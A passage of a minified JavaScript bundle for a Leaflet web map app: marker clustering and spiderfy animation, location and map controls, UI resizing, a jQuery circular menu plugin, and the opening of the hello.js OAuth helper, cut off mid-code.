return this._iconObj.createIcon();},createShadow:function(){return this._iconObj.createShadow();},_addChild:function(new1,isNotificationFromChild){this._iconNeedsUpdate=true;this._expandBounds(new1);if(new1 instanceof L.MarkerCluster){if(!isNotificationFromChild){this._childClusters.push(new1);new1.__parent=this;}
this._childCount+=new1._childCount;}else{if(!isNotificationFromChild){this._markers.push(new1);}
this._childCount++;}
if(this.__parent){this.__parent._addChild(new1,true);}},_expandBounds:function(marker){var addedCount,addedLatLng=marker._wLatLng||marker._latlng;if(marker instanceof L.MarkerCluster){this._bounds.extend(marker._bounds);addedCount=marker._childCount;}else{this._bounds.extend(addedLatLng);addedCount=1;}
if(!this._cLatLng){this._cLatLng=marker._cLatLng||addedLatLng;}
var totalCount=this._childCount+addedCount;if(!this._wLatLng){this._latlng=this._wLatLng=new L.LatLng(addedLatLng.lat,addedLatLng.lng);}else{this._wLatLng.lat=(addedLatLng.lat*addedCount+this._wLatLng.lat*this._childCount)/totalCount;this._wLatLng.lng=(addedLatLng.lng*addedCount+this._wLatLng.lng*this._childCount)/totalCount;}},_addToMap:function(startPos){if(startPos){this._backupLatlng=this._latlng;this.setLatLng(startPos);}
this._noHas=true;L.FeatureGroup.prototype.addLayer.call(this._group,this);delete this._noHas;},_recursivelyAnimateChildrenIn:function(bounds,center,maxZoom){this._recursively(bounds,0,maxZoom-1,function(c){var markers=c._markers,i,m;for(i=markers.length-1;i>=0;i--){m=markers[i];if(m._icon){m._setPos(center);m.setOpacity(0);}}},function(c){var childClusters=c._childClusters,j,cm;for(j=childClusters.length-1;j>=0;j--){cm=childClusters[j];if(cm._icon){cm._setPos(center);cm.setOpacity(0);}}});},_recursivelyAnimateChildrenInAndAddSelfToMap:function(bounds,previousZoomLevel,newZoomLevel){this._recursively(bounds,newZoomLevel,0,function(c){c._recursivelyAnimateChildrenIn(bounds,c._group._map.latLngToLayerPoint(c.getLatLng()).round(),previousZoomLevel);if(c._isSingleParent()&&previousZoomLevel-1===newZoomLevel){c.setOpacity(1);c._recursivelyRemoveChildrenFromMap(bounds,previousZoomLevel);}else{c.setOpacity(0);}
c._addToMap();});},_recursivelyBecomeVisible:function(bounds,zoomLevel){this._recursively(bounds,0,zoomLevel,null,function(c){c.setOpacity(1);});},_recursivelyAddChildrenToMap:function(startPos,zoomLevel,bounds){this._recursively(bounds,-1,zoomLevel,function(c){if(zoomLevel===c._zoom){return;}
for(var i=c._markers.length-1;i>=0;i--){var nm=c._markers[i];if(!bounds.contains(nm._latlng)){continue;}
if(startPos){nm._backupLatlng=nm.getLatLng();nm.setLatLng(startPos);nm.setOpacity(0);}
nm._noHas=true;L.FeatureGroup.prototype.addLayer.call(c._group,nm);delete nm._noHas;}},function(c){c._addToMap(startPos);});},_recursivelyRestoreChildPositions:function(zoomLevel){for(var i=this._markers.length-1;i>=0;i--){var nm=this._markers[i];if(nm._backupLatlng){nm.setLatLng(nm._backupLatlng);delete nm._backupLatlng;}}
if(zoomLevel-1===this._zoom){for(var j=this._childClusters.length-1;j>=0;j--){this._childClusters[j]._restorePosition();}}else{for(var k=this._childClusters.length-1;k>=0;k--){this._childClusters[k]._recursivelyRestoreChildPositions(zoomLevel);}}},_restorePosition:function(){if(this._backupLatlng){this.setLatLng(this._backupLatlng);delete this._backupLatlng;}},_recursivelyRemoveChildrenFromMap:function(previousBounds,zoomLevel,exceptBounds){var m,i;this._recursively(previousBounds,-1,zoomLevel-1,function(c){for(i=c._markers.length-1;i>=0;i--){m=c._markers[i];if(!exceptBounds||!exceptBounds.contains(m._latlng)){L.FeatureGroup.prototype.removeLayer.call(c._group,m);m.setOpacity(1);}}},function(c){for(i=c._childClusters.length-1;i>=0;i--){m=c._childClusters[i];if(!exceptBounds||!exceptBounds.contains(m._latlng)){if(!L.FeatureGroup.prototype.hasLayer||L.FeatureGroup.prototype.hasLayer.call(c._group,m)){L.FeatureGroup.prototype.removeLayer.call(c._group,m);}
m.setOpacity(1);}}});},_recursively:function(boundsToApplyTo,zoomLevelToStart,zoomLevelToStop,runAtEveryLevel,runAtBottomLevel){var childClusters=this._childClusters,zoom=this._zoom,i,c;if(zoomLevelToStart>zoom){for(i=childClusters.length-1;i>=0;i--){c=childClusters[i];if(boundsToApplyTo.intersects(c._bounds)){c._recursively(boundsToApplyTo,zoomLevelToStart,zoomLevelToStop,runAtEveryLevel,runAtBottomLevel);}}}else{if(runAtEveryLevel){runAtEveryLevel(this);}
if(runAtBottomLevel&&this._zoom===zoomLevelToStop){runAtBottomLevel(this);}
if(zoomLevelToStop>zoom){for(i=childClusters.length-1;i>=0;i--){c=childClusters[i];if(boundsToApplyTo.intersects(c._bounds)){c._recursively(boundsToApplyTo,zoomLevelToStart,zoomLevelToStop,runAtEveryLevel,runAtBottomLevel);}}}}},_recalculateBounds:function(){var markers=this._markers,childClusters=this._childClusters,i;this._bounds=new L.LatLngBounds();delete this._wLatLng;for(i=markers.length-1;i>=0;i--){this._expandBounds(markers[i]);}
for(i=childClusters.length-1;i>=0;i--){this._expandBounds(childClusters[i]);}},_isSingleParent:function(){return this._childClusters.length>0&&this._childClusters[0]._childCount===this._childCount;}});L.DistanceGrid=function(cellSize){this._cellSize=cellSize;this._sqCellSize=cellSize*cellSize;this._grid={};this._objectPoint={};};L.DistanceGrid.prototype={addObject:function(obj,point){var x=this._getCoord(point.x),y=this._getCoord(point.y),grid=this._grid,row=grid[y]=grid[y]||{},cell=row[x]=row[x]||[],stamp=L.Util.stamp(obj);this._objectPoint[stamp]=point;cell.push(obj);},updateObject:function(obj,point){this.removeObject(obj);this.addObject(obj,point);},removeObject:function(obj,point){var x=this._getCoord(point.x),y=this._getCoord(point.y),grid=this._grid,row=grid[y]=grid[y]||{},cell=row[x]=row[x]||[],i,len;delete this._objectPoint[L.Util.stamp(obj)];for(i=0,len=cell.length;i<len;i++){if(cell[i]===obj){cell.splice(i,1);if(len===1){delete row[x];}
return true;}}},eachObject:function(fn,context){var i,j,k,len,row,cell,removed,grid=this._grid;for(i in grid){row=grid[i];for(j in row){cell=row[j];for(k=0,len=cell.length;k<len;k++){removed=fn.call(context,cell[k]);if(removed){k--;len--;}}}}},getNearObject:function(point){var x=this._getCoord(point.x),y=this._getCoord(point.y),i,j,k,row,cell,len,obj,dist,objectPoint=this._objectPoint,closestDistSq=this._sqCellSize,closest=null;for(i=y-1;i<=y+1;i++){row=this._grid[i];if(row){for(j=x-1;j<=x+1;j++){cell=row[j];if(cell){for(k=0,len=cell.length;k<len;k++){obj=cell[k];dist=this._sqDist(objectPoint[L.Util.stamp(obj)],point);if(dist<closestDistSq){closestDistSq=dist;closest=obj;}}}}}}
return closest;},_getCoord:function(x){return Math.floor(x/this._cellSize);},_sqDist:function(p,p2){var dx=p2.x-p.x,dy=p2.y-p.y;return dx*dx+dy*dy;}};(function(){L.QuickHull={getDistant:function(cpt,bl){var vY=bl[1].lat-bl[0].lat,vX=bl[0].lng-bl[1].lng;return(vX*(cpt.lat-bl[0].lat)+vY*(cpt.lng-bl[0].lng));},findMostDistantPointFromBaseLine:function(baseLine,latLngs){var maxD=0,maxPt=null,newPoints=[],i,pt,d;for(i=latLngs.length-1;i>=0;i--){pt=latLngs[i];d=this.getDistant(pt,baseLine);if(d>0){newPoints.push(pt);}else{continue;}
if(d>maxD){maxD=d;maxPt=pt;}}
return{'maxPoint':maxPt,'newPoints':newPoints};},buildConvexHull:function(baseLine,latLngs){var convexHullBaseLines=[],t=this.findMostDistantPointFromBaseLine(baseLine,latLngs);if(t.maxPoint){convexHullBaseLines=convexHullBaseLines.concat(this.buildConvexHull([baseLine[0],t.maxPoint],t.newPoints));convexHullBaseLines=convexHullBaseLines.concat(this.buildConvexHull([t.maxPoint,baseLine[1]],t.newPoints));return convexHullBaseLines;}else{return[baseLine];}},getConvexHull:function(latLngs){var maxLat=false,minLat=false,maxPt=null,minPt=null,i;for(i=latLngs.length-1;i>=0;i--){var pt=latLngs[i];if(maxLat===false||pt.lat>maxLat){maxPt=pt;maxLat=pt.lat;}
if(minLat===false||pt.lat<minLat){minPt=pt;minLat=pt.lat;}}
var ch=[].concat(this.buildConvexHull([minPt,maxPt],latLngs),this.buildConvexHull([maxPt,minPt],latLngs));return ch;}};}());L.MarkerCluster.include({getConvexHull:function(){var childMarkers=this.getAllChildMarkers(),points=[],hullLatLng=[],hull,p,i;for(i=childMarkers.length-1;i>=0;i--){p=childMarkers[i].getLatLng();points.push(p);}
hull=L.QuickHull.getConvexHull(points);for(i=hull.length-1;i>=0;i--){hullLatLng.push(hull[i][0]);}
return hullLatLng;}});L.MarkerCluster.include({_2PI:Math.PI*2,_circleFootSeparation:25,_circleStartAngle:Math.PI/6,_spiralFootSeparation:28,_spiralLengthStart:11,_spiralLengthFactor:5,_circleSpiralSwitchover:9,spiderfy:function(){if(this._group._spiderfied===this||this._group._inZoomAnimation){return;}
var childMarkers=this.getAllChildMarkers(),group=this._group,map=group._map,center=map.latLngToLayerPoint(this._latlng),positions;this._group._unspiderfy();this._group._spiderfied=this;if(childMarkers.length>=this._circleSpiralSwitchover){positions=this._generatePointsSpiral(childMarkers.length,center);}else{center.y+=10;positions=this._generatePointsCircle(childMarkers.length,center);}
this._animationSpiderfy(childMarkers,positions);},unspiderfy:function(zoomDetails){if(this._group._inZoomAnimation){return;}
this._animationUnspiderfy(zoomDetails);this._group._spiderfied=null;},_generatePointsCircle:function(count,centerPt){var circumference=this._group.options.spiderfyDistanceMultiplier*this._circleFootSeparation*(2+count),legLength=circumference/this._2PI,angleStep=this._2PI/count,res=[],i,angle;res.length=count;for(i=count-1;i>=0;i--){angle=this._circleStartAngle+i*angleStep;res[i]=new L.Point(centerPt.x+legLength*Math.cos(angle),centerPt.y+legLength*Math.sin(angle))._round();}
return res;},_generatePointsSpiral:function(count,centerPt){var legLength=this._group.options.spiderfyDistanceMultiplier*this._spiralLengthStart,separation=this._group.options.spiderfyDistanceMultiplier*this._spiralFootSeparation,lengthFactor=this._group.options.spiderfyDistanceMultiplier*this._spiralLengthFactor,angle=0,res=[],i;res.length=count;for(i=count-1;i>=0;i--){angle+=separation/legLength+i*0.0005;res[i]=new L.Point(centerPt.x+legLength*Math.cos(angle),centerPt.y+legLength*Math.sin(angle))._round();legLength+=this._2PI*lengthFactor/angle;}
return res;},_noanimationUnspiderfy:function(){var group=this._group,map=group._map,childMarkers=this.getAllChildMarkers(),m,i;this.setOpacity(1);for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i];L.FeatureGroup.prototype.removeLayer.call(group,m);if(m._preSpiderfyLatlng){m.setLatLng(m._preSpiderfyLatlng);delete m._preSpiderfyLatlng;}
m.setZIndexOffset(0);if(m._spiderLeg){map.removeLayer(m._spiderLeg);delete m._spiderLeg;}}}});L.MarkerCluster.include(!L.DomUtil.TRANSITION?{_animationSpiderfy:function(childMarkers,positions){var group=this._group,map=group._map,i,m,leg,newPos;for(i=childMarkers.length-1;i>=0;i--){newPos=map.layerPointToLatLng(positions[i]);m=childMarkers[i];m._preSpiderfyLatlng=m._latlng;m.setLatLng(newPos);m.setZIndexOffset(1000000);L.FeatureGroup.prototype.addLayer.call(group,m);leg=new L.Polyline([this._latlng,newPos],{weight:1.5,color:'#222'});map.addLayer(leg);m._spiderLeg=leg;}
this.setOpacity(0.3);group.fire('spiderfied');},_animationUnspiderfy:function(){this._noanimationUnspiderfy();}}:{SVG_ANIMATION:(function(){return document.createElementNS('http://www.w3.org/2000/svg','animate').toString().indexOf('SVGAnimate')>-1;}()),_animationSpiderfy:function(childMarkers,positions){var me=this,group=this._group,map=group._map,thisLayerPos=map.latLngToLayerPoint(this._latlng),i,m,leg,newPos;for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i];m.setZIndexOffset(1000000);m.setOpacity(0);m._noHas=true;L.FeatureGroup.prototype.addLayer.call(group,m);delete m._noHas;m._setPos(thisLayerPos);}
group._forceLayout();group._animationStart();var initialLegOpacity=L.Path.SVG?0:0.3,xmlns=L.Path.SVG_NS;for(i=childMarkers.length-1;i>=0;i--){newPos=map.layerPointToLatLng(positions[i]);m=childMarkers[i];m._preSpiderfyLatlng=m._latlng;m.setLatLng(newPos);m.setOpacity(1);leg=new L.Polyline([me._latlng,newPos],{weight:1.5,color:'#222',opacity:initialLegOpacity});map.addLayer(leg);m._spiderLeg=leg;if(!L.Path.SVG||!this.SVG_ANIMATION){continue;}
var length=leg._path.getTotalLength();leg._path.setAttribute("stroke-dasharray",length+","+length);var anim=document.createElementNS(xmlns,"animate");anim.setAttribute("attributeName","stroke-dashoffset");anim.setAttribute("begin","indefinite");anim.setAttribute("from",length);anim.setAttribute("to",0);anim.setAttribute("dur",0.25);leg._path.appendChild(anim);anim.beginElement();anim=document.createElementNS(xmlns,"animate");anim.setAttribute("attributeName","stroke-opacity");anim.setAttribute("attributeName","stroke-opacity");anim.setAttribute("begin","indefinite");anim.setAttribute("from",0);anim.setAttribute("to",0.5);anim.setAttribute("dur",0.25);leg._path.appendChild(anim);anim.beginElement();}
me.setOpacity(0.3);if(L.Path.SVG){this._group._forceLayout();for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i]._spiderLeg;m.options.opacity=0.5;m._path.setAttribute('stroke-opacity',0.5);}}
setTimeout(function(){group._animationEnd();group.fire('spiderfied');},200);},_animationUnspiderfy:function(zoomDetails){var group=this._group,map=group._map,thisLayerPos=zoomDetails?map._latLngToNewLayerPoint(this._latlng,zoomDetails.zoom,zoomDetails.center):map.latLngToLayerPoint(this._latlng),childMarkers=this.getAllChildMarkers(),svg=L.Path.SVG&&this.SVG_ANIMATION,m,i,a;group._animationStart();this.setOpacity(1);for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i];if(!m._preSpiderfyLatlng){continue;}
m.setLatLng(m._preSpiderfyLatlng);delete m._preSpiderfyLatlng;m._setPos(thisLayerPos);m.setOpacity(0);if(svg){a=m._spiderLeg._path.childNodes[0];a.setAttribute('to',a.getAttribute('from'));a.setAttribute('from',0);a.beginElement();a=m._spiderLeg._path.childNodes[1];a.setAttribute('from',0.5);a.setAttribute('to',0);a.setAttribute('stroke-opacity',0);a.beginElement();m._spiderLeg._path.setAttribute('stroke-opacity',0);}}
setTimeout(function(){var stillThereChildCount=0;for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i];if(m._spiderLeg){stillThereChildCount++;}}
for(i=childMarkers.length-1;i>=0;i--){m=childMarkers[i];if(!m._spiderLeg){continue;}
m.setOpacity(1);m.setZIndexOffset(0);if(stillThereChildCount>1){L.FeatureGroup.prototype.removeLayer.call(group,m);}
map.removeLayer(m._spiderLeg);delete m._spiderLeg;}
group._animationEnd();},200);}});L.MarkerClusterGroup.include({_spiderfied:null,_spiderfierOnAdd:function(){this._map.on('click',this._unspiderfyWrapper,this);if(this._map.options.zoomAnimation){this._map.on('zoomstart',this._unspiderfyZoomStart,this);}else{this._map.on('zoomend',this._unspiderfyWrapper,this);}
if(L.Path.SVG&&!L.Browser.touch){this._map._initPathRoot();}},_spiderfierOnRemove:function(){this._map.off('click',this._unspiderfyWrapper,this);this._map.off('zoomstart',this._unspiderfyZoomStart,this);this._map.off('zoomanim',this._unspiderfyZoomAnim,this);this._unspiderfy();},_unspiderfyZoomStart:function(){if(!this._map){return;}
this._map.on('zoomanim',this._unspiderfyZoomAnim,this);},_unspiderfyZoomAnim:function(zoomDetails){if(L.DomUtil.hasClass(this._map._mapPane,'leaflet-touching')){return;}
this._map.off('zoomanim',this._unspiderfyZoomAnim,this);this._unspiderfy(zoomDetails);},_unspiderfyWrapper:function(){this._unspiderfy();},_unspiderfy:function(zoomDetails){if(this._spiderfied){this._spiderfied.unspiderfy(zoomDetails);}},_noanimationUnspiderfy:function(){if(this._spiderfied){this._spiderfied._noanimationUnspiderfy();}},_unspiderfyLayer:function(layer){if(layer._spiderLeg){L.FeatureGroup.prototype.removeLayer.call(this,layer);layer.setOpacity(1);layer.setZIndexOffset(0);this._map.removeLayer(layer._spiderLeg);delete layer._spiderLeg;}}});}(this));
// TraceLayer.js

$data.LeafletTrace=L.Control.extend({options:{position:'topright',autoZIndex:true,attribution:'JayData'},initialize:function(options){L.setOptions(this,options);},onAdd:function(map){var container=this._container=L.DomUtil.create('div','leaflet-control-options');$(container).html('v1.0b3');return container;},getAttribution:function(){return"JayData";},logLine:function(log){},log:function(log){},});
// leafletjs/L.Control.Locate.js

L.Control.Locate=L.Control.extend({options:{position:'topleft',drawCircle:true,follow:false,circleStyle:{color:'#136AEC',fillColor:'#136AEC',fillOpacity:0.15,weight:2,opacity:0.5},markerStyle:{color:'#136AEC',fillColor:'#2A93EE',fillOpacity:0.7,weight:2,opacity:0.9,radius:16},metric:true,debug:false,onLocationError:function(err){alert(err.message);},title:"Show me where I am",popupText:["You are within "," from this point"],setView:true,locateOptions:{}},onAdd:function(map){var className='leaflet-control-locate',classNames=className+' leaflet-bar leaflet-control',container=L.DomUtil.create('div',classNames);var self=this;this._layer=new L.LayerGroup();this._layer.addTo(map);this._event=undefined;this._locateOptions=L.extend(L.extend({'setView':false},this.options.locateOptions),{'watch':true});this._locateOnNextLocationFound=false;this._active=false;var link=L.DomUtil.create('a','leaflet-bar-part',container);link.href='#';link.title=this.options.title;var _log=function(data){if(self.options.debug){console.log(data);}};function toggleState(){if(self._active&&(map.getBounds().contains(self._event.latlng)||!self.options.setView)){stopLocate();}else{if(self.options.setView){self._locateOnNextLocationFound=true;}
if(!self._active){map.locate(self._locateOptions);}
self._active=true;if(!self._event){self._container.className=classNames+" requesting";}else{visualizeLocation();}}};self.toggleState=toggleState;L.DomEvent.on(link,'click',L.DomEvent.stopPropagation).on(link,'click',L.DomEvent.preventDefault).on(link,'click',toggleState).on(link,'dblclick',L.DomEvent.stopPropagation);var onLocationFound=function(e){_log('onLocationFound');if(self._event&&(self._event.latlng.lat!=e.latlng.lat||self._event.latlng.lng!=e.latlng.lng)){_log('location has changed');}
self._event=e;if(!self._active){return;}
if(self.options.follow){self._locateOnNextLocationFound=true;}
visualizeLocation();};var visualizeLocation=function(){_log('visualizeLocation,'+'setView:'+self._locateOnNextLocationFound);var radius=self._event.accuracy/2;if(self._locateOnNextLocationFound){map.panTo(self._event.bounds.getCenter());self._locateOnNextLocationFound=false;}
self._layer.clearLayers();if(self.options.drawCircle){L.circle(self._event.latlng,radius,self.options.circleStyle).addTo(self._layer);}
var distance,unit;if(self.options.metric){distance=radius.toFixed(0);unit="meters";}else{distance=(radius*3.2808399).toFixed(0);unit="feet";}
var t=self.options.popupText;L.circleMarker(self._event.latlng,self.options.markerStyle).bindPopup(t[0]+distance+" "+unit+t[1]).addTo(self._layer);if(!self._container)
return;self._container.className=classNames+" active";};var stopLocate=function(){map.stopLocate();self._container.className=classNames;self._active=false;self._layer.clearLayers();};var onLocationError=function(err){_log('onLocationError');if(err.code==3&&this._locateOptions.watch){return;}
self._container.className=classNames;stopLocate();self.options.onLocationError(err);};map.on('locationfound',onLocationFound,self);map.on('locationerror',onLocationError,self);return container;}});L.Map.addInitHook(function(){if(this.options.locateControl){this.locateControl=L.control.locate();this.addControl(this.locateControl);}});L.control.locate=function(options){return new L.Control.Locate(options);};
// OptionsLayer.js

$data.NetworkIndicator=L.Control.extend({options:{position:'topleft',autoZIndex:true},initialize:function(options){L.setOptions(this,options);},onAdd:function(map){var container=this._container=L.DomUtil.create('div','leaflet-bar leaflet-control-network');return container;},setVisible:function(v){if(v){$(this._container).removeClass('hidden');}else{$(this._container).addClass('hidden');}},beginProcess:function(process){var indicator=$("<div style='font-size: 8pt'><img src='ajax-loader.gif' /></div>");$(this._container).append(indicator);indicator.complete=function(message){if(message){$(indicator).html(message);window.setTimeout(function(){$(indicator).remove();},2000);}else{$(indicator).remove();}}
return indicator;},_initLayout:function(){}});$data.EditMode=L.Control.extend({options:{position:'topleft',autoZIndex:true},initialize:function(options){L.setOptions(this,options);},onAdd:function(map){var container=this._container=L.DomUtil.create('div','leaflet-bar leaflet-control-edit-switch ');$(container).append("<center><i href='#' class='foundicon-edit'></i></center>");var options=this.options;$(container).on("click",function(){$(container).toggleClass("active");options.app.toggleEditMode();return false;});return container;},setVisible:function(v){if(v){$(this._container).removeClass('hidden');}else{$(this._container).addClass('hidden');}},});$data.MapSearch=L.Control.extend({options:{position:'topright',autoZIndex:true},initialize:function(options){L.setOptions(this,options);},onAdd:function(map){var container=this._container=L.DomUtil.create('div','leaflet-bar leaflet-control-search ');$(container).append("<span class='foundicon-search'></span><span id='searchDisplay'></span>");var options=this.options;$(container).on("click",function(){toggleMap();$.observable(app).setProperty("items",app.currentOptions.points);return false;});return container;},});
// js/ui.js

function initUI(){var resizeTrigger;if(window.orientation===undefined){window.onresize=function(event){clearTimeout(resizeTrigger);resizeTrigger=setTimeout(function(){resizeUI();},100);}}else{window.onorientationchange=function(event){clearTimeout(resizeTrigger);resizeTrigger=setTimeout(function(){resizeUI();},100);}}};window.hideRightPanel=function hideRightPanel(){$(".right-panel").addClass("hidden");}
window.showRightPanel=function showRightPanel(){$(".right-panel").removeClass("hidden");}
window.toggleRightPanel=function toggleRightPanel(){var right=$(".right-column");right.toggleClass("hidden");}
window.resizeUI=function resizeUI(){var mapHtml=document.getElementById("map"),left=$('.left-column'),large9=$(".large-9")[0],windowWidth=window.innerWidth,windowHeight=window.innerHeight;document.getElementById('editorPanel').style.height=windowHeight+"px";if(windowWidth<480){if(left.hasClass("open")){mapHtml.style.height=(windowHeight-250)+"px";large9.style.height=(windowHeight-250)+"px";document.querySelectorAll(".row.collapse.relative")[0].style.height=(windowHeight-250)+"px";}else{mapHtml.style.height=windowHeight+"px";large9.style.height=windowHeight+"px";document.querySelectorAll(".row.collapse.relative")[0].style.height=(windowHeight)+"px";}
mapHtml.style.width=windowWidth+"px";large9.style.width=windowWidth+"px";left[0].removeAttribute("style");}
else if(windowWidth>=480&&windowWidth<=768){if(left.hasClass("open")){mapHtml.style.width=(windowWidth-$(".left-column").width())+"px";large9.style.width=(windowWidth-$(".left-column").width()-1)+"px";left[0].style.height=windowHeight+"px";}else{mapHtml.style.width=windowWidth+"px";large9.style.width=windowWidth+"px";}
mapHtml.style.height=windowHeight+"px";large9.style.height=windowHeight+"px";document.querySelectorAll(".row.collapse.relative")[0].style.height=(windowHeight-67)+"px";}
else{mapHtml.style.width=(windowWidth-left.width())+"px";mapHtml.style.height=windowHeight+"px";large9.style.height=windowHeight+"px";left[0].style.height=windowHeight+"px";document.querySelectorAll(".row.collapse.relative")[0].style.height=(windowHeight-67)+"px";}
lmap.invalidateSize();}
window.toggleMap=function toggleMap(){$(".left-column").toggleClass("open");$(".map").toggleClass("open");resizeUI();}
// js/jQuery.circleMenu.js
;(function($,window,document,undefined){var pluginName='circleMenu',defaults={depth:0,item_diameter:30,circle_radius:80,angle:{start:0,end:90},speed:500,delay:1000,step_out:20,step_in:-20,trigger:'hover',transition_function:'ease'};function vendorPrefixes(items,prop,value){['-webkit-','-moz-','-o-','-ms-',''].forEach(function(prefix){items.css(prefix+prop,value);});}
function CircleMenu(element,options){this._timeouts=[];this.element=$(element);this.options=$.extend({},defaults,options);this._defaults=defaults;this._name=pluginName;this.init();this.hook();}
CircleMenu.prototype.init=function(){var self=this,directions={'bottom-left':[180,90],'bottom':[135,45],'right':[-45,45],'left':[225,135],'top':[225,315],'bottom-half':[180,0],'right-half':[-90,90],'left-half':[270,90],'top-half':[180,360],'top-left':[270,180],'top-right':[270,360],'full':[-90,270-Math.floor(360/(self.element.children('li').length-1))],'bottom-right':[0,90]},dir;self._state='closed';self.element.addClass(pluginName+'-closed');if(typeof self.options.direction==='string'){dir=directions[self.options.direction.toLowerCase()];if(dir){self.options.angle.start=dir[0];self.options.angle.end=dir[1];}}
self.menu_items=self.element.children('li:not(:first-child)');self.initCss();self.item_count=self.menu_items.length;self._step=(self.options.angle.end-self.options.angle.start)/(self.item_count-1);self.menu_items.each(function(index){var $item=$(this),angle=(self.options.angle.start+(self._step*index))*(Math.PI/180),x=Math.round(self.options.circle_radius*Math.cos(angle)),y=Math.round(self.options.circle_radius*Math.sin(angle));$item.data('plugin_'+pluginName+'-pos-x',x);$item.data('plugin_'+pluginName+'-pos-y',y);$item.on('click',function(){self.select(index+2);});});['open','close','init','select'].forEach(function(evt){var fn;if(self.options[evt]){fn=self.options[evt];self.element.on(pluginName+'-'+evt,function(){return fn.apply(self,arguments);});delete self.options[evt];}});self.submenus=self.menu_items.children('ul');self.submenus.circleMenu($.extend({},self.options,{depth:self.options.depth+1}));self.trigger('init');};CircleMenu.prototype.trigger=function(){var args=[],i,len;for(i=0,len=arguments.length;i<len;i++){args.push(arguments[i]);}
var res=this.element.trigger(pluginName+'-'+args.shift(),args);return res;};CircleMenu.prototype.hook=function(){var self=this;if(self.options.trigger==='hover'){self.element.on('mouseenter',function(evt){self.open();}).on('mouseleave',function(evt){self.close();});}else if(self.options.trigger==='click'){self.element.children('li:first-child').on('click',function(evt){evt.preventDefault();if(self._state==='closed'||self._state==='closing'){self.open();}else{self.close(true);}
return false;});}else if(self.options.trigger==='none'){}};CircleMenu.prototype.open=function(){var self=this,$self=this.element,start=0,set;var setTimeout=window.webkitRequestAnimationFrame||window.setTimeout;self.clearTimeouts();if(self._state==='open')return self;$self.addClass(pluginName+'-open');$self.removeClass(pluginName+'-closed');if(self.options.step_out>=0){set=self.menu_items;}else{set=$(self.menu_items.get().reverse());}
set.each(function(index){var $item=$(this);self._timeouts.push(setTimeout(function(){$item.css({left:$item.data('plugin_'+pluginName+'-pos-x')+'px',top:$item.data('plugin_'+pluginName+'-pos-y')+'px'});vendorPrefixes($item,'transform','scale(1)');},start+Math.abs(self.options.step_out)*index));});self._timeouts.push(setTimeout(function(){if(self._state==='opening')self.trigger('open');self._state='open';},start+Math.abs(self.options.step_out)*set.length));self._state='opening';return self;};CircleMenu.prototype.close=function(immediate){var self=this,$self=this.element,do_animation=function do_animation(){var start=0,set;var setTimeout=window.webkitRequestAnimationFrame||window.setTimeout;self.submenus.circleMenu('close');self.clearTimeouts();if(self._state==='closed')return self;if(self.options.step_in>=0){set=self.menu_items;}else{set=$(self.menu_items.get().reverse());}
set.each(function(index){var $item=$(this);self._timeouts.push(setTimeout(function(){$item.css({top:0,left:0});vendorPrefixes($item,'transform','scale(.5)');},start+Math.abs(self.options.step_in)*index));});self._timeouts.push(setTimeout(function(){if(self._state==='closing')self.trigger('close');self._state='closed';},start+Math.abs(self.options.step_in)*set.length));$self.removeClass(pluginName+'-open');$self.addClass(pluginName+'-closed');self._state='closing';return self;};if(immediate){do_animation();}else{self._timeouts.push(setTimeout(do_animation,self.options.delay));}
return this;};CircleMenu.prototype.select=function(index){var self=this,selected,set_other;if(self._state==='open'||self._state==='opening'){self.clearTimeouts();set_other=self.element.children('li:not(:nth-child('+index+'),:first-child)');selected=self.element.children('li:nth-child('+index+')');self.trigger('select',selected);vendorPrefixes(selected.add(set_other),'transition','all 500ms ease-out');vendorPrefixes(selected,'transform','scale(2)');vendorPrefixes(set_other,'transform','scale(0)');selected.css('opacity','0');set_other.css('opacity','0');self.element.removeClass(pluginName+'-open');setTimeout(function(){self.initCss();},500);}};CircleMenu.prototype.clearTimeouts=function(){var timeout;while(timeout=this._timeouts.shift()){clearTimeout(timeout);}};CircleMenu.prototype.initCss=function(){var self=this,$items;self._state='closed';self.element.removeClass(pluginName+'-open');self.element.css({'list-style':'none','margin':0,'padding':0,'width':self.options.item_diameter+'px'});$items=self.element.children('li');$items.attr('style','');$items.css({'display':'block','width':self.options.item_diameter+'px','height':self.options.item_diameter+'px','text-align':'center','line-height':self.options.item_diameter+'px','position':'absolute','z-index':1,'opacity':''});self.element.children('li:first-child').css({'z-index':1000-self.options.depth});self.menu_items.css({top:0,left:0});vendorPrefixes($items,'border-radius',self.options.item_diameter+'px');vendorPrefixes(self.menu_items,'transform','scale(.5)');setTimeout(function(){vendorPrefixes($items,'transition','all '+self.options.speed+'ms '+self.options.transition_function);},0);};$.fn[pluginName]=function(options){return this.each(function(){var obj=$.data(this,'plugin_'+pluginName),commands={'init':function(){obj.init();},'open':function(){obj.open();},'close':function(){obj.close(true);}};if(typeof options==='string'&&obj&&commands[options]){commands[options]();}
if(!obj){$.data(this,'plugin_'+pluginName,new CircleMenu(this,options));}});};})(jQuery,window,document);
// js/hello.min.js

var hello=(function(){"use strict";var _jsonp_counter=0;var listeners={};var shy={position:'absolute',left:"-1000px",bottom:0,height:'1px',width:'1px'};var _timeout=20000;var _initstarted=false;var _services={};var old_session={},pending={};(function self(){for(var x in _services){if(_services.hasOwnProperty(x)){if(!_services[x].id){continue;}
var session=hello.getAuthResponse(x)||{};var oldsess=old_session[x]||{};var evt='';if(session&&"callback"in session&&session.callback in listeners){var cb=session.callback;try{delete session.callback;}catch(e){}
_store(x,session);hello.trigger(cb,{network:x,authResponse:session});}
if(session&&("expires"in session)&&session.expires<((new Date()).getTime()/1e3)){if(!(x in pending)||pending[x]<((new Date()).getTime()/1e3)){log(x+" has expired trying to resignin");hello.login(x,{display:'none'});pending[x]=((new Date()).getTime()/1e3)+600;}
continue;}
else if(oldsess.access_token===session.access_token&&oldsess.expires===session.expires){continue;}
else if(!session.access_token&&oldsess.access_token){hello.trigger(x+':auth.logout',{network:x,authResponse:session});}
else if(session.access_token&&!oldsess.access_token){hello.trigger(x+':auth.login',{network:x,authResponse:session});}
else if(session.expires!==oldsess.expires){hello.trigger(x+':auth.update',{network:x,authResponse:session});}
old_session[x]=session;}}
setTimeout(self,1000);})();var hello={settings:{redirect_uri:window.location.href.split('#')[0],response_type:'token',display:'popup',oauth_proxy:'https://auth-server.herokuapp.com/proxy',state:''},service:function(service){if(typeof(service)!=='undefined'){return _store('sync_service',service);}
